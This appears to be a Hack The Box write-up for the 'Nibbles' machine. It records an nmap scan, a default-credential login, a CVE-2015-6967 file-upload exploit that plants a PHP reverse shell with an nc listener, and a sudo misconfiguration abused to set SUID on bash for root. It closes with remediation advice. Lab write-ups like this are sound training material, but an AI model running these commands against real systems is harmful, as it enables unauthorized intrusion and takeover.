+++
date = '2026-06-05T21:44:31-04:00'
title = 'Nibbles'
tags = ["htb", "easy"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/344a8f99e8f7dddfed764f791e2731df.png)

https://www.hackthebox.com/machines/Nibbles
## OS:  Ubuntu
``` IP
10.129.10.51
```
## Credentials:

| Username | Password | Notes/Hash                             |
| -------- | -------- | -------------------------------------- |
| admin    | nibbles  | password found with Google AI Overview |

---
## `nmap` results:
 ```
 # Nmap 7.99 scan initiated Fri Jun  5 20:40:31 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Nibbles 10.129.10.51
Nmap scan report for 10.129.10.51
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2026-06-05 20:40:32 EDT for 20s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
 ```

 
---
## Attack + Enum Vectors
- TCP 80: HTTP Apache httpd 2.4.18
- TCP 22: SSH OpenSSH 7.2p2
### UDP (161 SNMP)?
- 


---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
Let's first visit the home page of the web site:
```
http://10.129.10.51/
```
Shows: `Hello World!`; before leveraging to `gobuster` I want to see the source code. Let's hit `Ctrl + U` to see source code or preppend `view-source:` in the URL
```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
shows a `/nibbleblog/` directory, which is the same as the box's name. I've also done a `Nibbles` lab from OffSec's Proving Grounds that had `nibbleblog` which rings a bell about some possible exploits. First, let's visit the `/nibbleblog` 
```
http://10.129.10.51/nibbleblog
```
Shows a pretty empty page; there's two options right now, either I can start `gobuster` and look for interesting directories or files, or: search `nibbleblog` on google; and we found: 
https://github.com/dignajar/nibbleblog

Under the github, we saw an `admin.php` file, which could be the `admin` page
```
http://10.129.10.51/nibbleblog/admin.php
```
and I tried `admin:admin` and also `admin:password`, but wasn't able to get in. So I started looking under the github page or online if there is default password; interesting enough the Google AI overview displayed `admin:nibbles` as default password but I couldn't find the source to. However, we got in to the admin page. I guess we should guess these names or box names as password for the admin?

---
## Initial Foothold
Now let's enumerate to see if there is any where we can upload a `.php` reverse shell or get a remote code execution. Under `settings` we found the `Nibbleblog 4.0.3` as version number. Change of plans, let's search if there's public exploits then: first results on google we found: https://github.com/dix0nym/CVE-2015-6967
```
git clone https://github.com/dix0nym/CVE-2015-6967
```
It seems like we can upload any file with as authenticated user.
```
cp /usr/share/webshells/php/php-reverse-shell.php .
```
now we edit the reverse shell with our IP address and port. Start listener:
```
sudo nc -lvnp 1337
```
then upload shell:
```
python3 exploit.py --url http://10.129.10.51/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php
```
And... We got shell! Let's upgrade our shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
`Ctrl + Z` to background our shell
```
stty raw -echo;fg
```
```
reset
```
then enter my `tmux` size:
```
stty rows 48 cols 210
```
And there we have a fully functioning shell!

---
## Priv Esc
As usual, let's check `sudo` permissions:
```
sudo -l
```
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Okay this is just butter, since there is no `/home/nibbler/personal`:
```
mkdir -p /home/nibbler/personal/stuff
```
this will create all of the necessary directories that doesn't exist, then:
```
vim /home/nibbler/personal/stuff/monitor.sh
```
and add:
```
#!/bin/bash
chmod +s /bin/bash
```
There's a hundred thousand ways how this can be done, but I prefer this way since I like to abuse SUID bash. Now, let's give it execute permissions:
```
chmod +x /home/nibbler/personal/stuff/monitor.sh
```
```
sudo /home/nibbler/personal/stuff/monitor.sh
```
and if we check
```
ls -lah /bin/bash
```
it has SUID bit now, let's spawn root shell:
```
/bin/bash -p
```
And we got rooted!

Therefore pwn'd.

---
## Conclusion & Remediation
Overall, very easy machine, I think the password guessing was hard for people that first did this box because I didn't find any online source saying `admin:nibbles` is the default password. However, since I did this box in 2026, Google gathered data from writeups that stated the password. The privilege escalation was extremely easy on the other hand, but overall good warm up box.

To remediate for such attacks: first system administartors should stop using `nibbleblog` or other End-of-Life web services immediately since they will not be receiving security updates for vulnerabilities. In addition, the use of simple and default passwords should not be implemented in any web services; attackers may be able to gain initial access if they gain authenticated access to web services. Lastly, `sudo` privileges should follow the least privilege principle as gaining root access with `sudo` can be fairly simple like this box.